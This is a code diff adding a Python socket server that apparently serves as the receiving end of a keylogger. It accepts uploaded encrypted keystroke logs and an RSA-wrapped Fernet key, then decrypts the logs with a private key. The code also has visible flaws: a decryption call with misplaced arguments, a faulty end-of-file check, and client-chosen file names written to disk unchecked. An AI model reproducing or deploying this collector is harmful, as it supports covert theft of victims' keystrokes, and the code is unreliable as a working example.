@@ -1,0 +1,49 @@
+import socket
+from cryptography.fernet import Fernet
+import rsa
+
+SERVER = '192.168.29.131'
+PORT = 8865
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((SERVER, PORT))
+s.listen(5)
+
+
+def prep_key(enc_key):
+    priv_key = rsa.PrivateKey.load_pkcs1(open('private.pem', 'rb').read())
+    return Fernet(rsa.decrypt(enc_key, priv_key))
+
+
+def decrypt_file(f_key, file):
+    enc_logs = open(file).read()
+    return f_key.decrypt(enc_logs)
+
+
+def recv_file():
+    client, addr = s.accept()
+    file_name = str(client.recv(1024).decode())
+    with open(file_name, 'wb') as file:
+        file_bytes = b''
+        done = False
+
+        while not done:
+            data = client.recv(1024)
+            if file_bytes[-13:] == b'<END OF FILE>':
+                print(f'[!]\tFile Received: {file_name}')
+                done = True
+                break
+            else:
+                print('downloading file...')
+                file_bytes += data
+
+        file.write(file_bytes)
+        client.close()
+
+
+recv_file()     # for logs
+recv_file()     # for key
+
+enc_key = open('fernet.key', 'rb').read()
+print(decrypt_file(prep_key(enc_key)), 'key.log')
+s.close()
